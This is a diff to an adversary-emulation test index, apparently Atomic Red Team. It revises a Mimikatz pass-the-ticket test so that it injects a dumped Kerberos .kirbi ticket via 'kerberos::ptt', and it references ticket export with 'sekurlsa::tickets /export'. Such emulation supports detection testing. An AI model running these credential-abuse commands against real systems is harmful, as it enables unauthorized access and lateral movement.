@@ -32872,14 +32872,11 @@ defense-evasion:
       supported_platforms:
       - windows
       input_arguments:
-        user_name:
-          description: username
+        ticket:
+          description: Ticket file name usually format of 'id-username\@domain.kirbi'
+            (e.g. can be dumped by "sekurlsa::tickets /export" module)
           type: String
-          default: Administrator
-        domain:
-          description: domain
-          type: String
-          default: atomic.local
+          default: 
         mimikatz_exe:
           description: Path of the Mimikatz binary
           type: Path
@@ -32900,7 +32897,9 @@ defense-evasion:
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
       executor:
-        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
+        command: '#{mimikatz_exe} "kerberos::ptt #{ticket}"
+
+'
         name: command_prompt
   T1556.002:
     technique:
@@ -66071,14 +66070,11 @@ lateral-movement:
       supported_platforms:
       - windows
       input_arguments:
-        user_name:
-          description: username
+        ticket:
+          description: Ticket file name usually format of 'id-username\@domain.kirbi'
+            (e.g. can be dumped by "sekurlsa::tickets /export" module)
           type: String
-          default: Administrator
-        domain:
-          description: domain
-          type: String
-          default: atomic.local
+          default: 
         mimikatz_exe:
           description: Path of the Mimikatz binary
           type: Path
@@ -66099,7 +66095,9 @@ lateral-movement:
           New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
           Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
       executor:
-        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
+        command: '#{mimikatz_exe} "kerberos::ptt #{ticket}"
+
+'
         name: command_prompt
   T1563.002:
     technique:
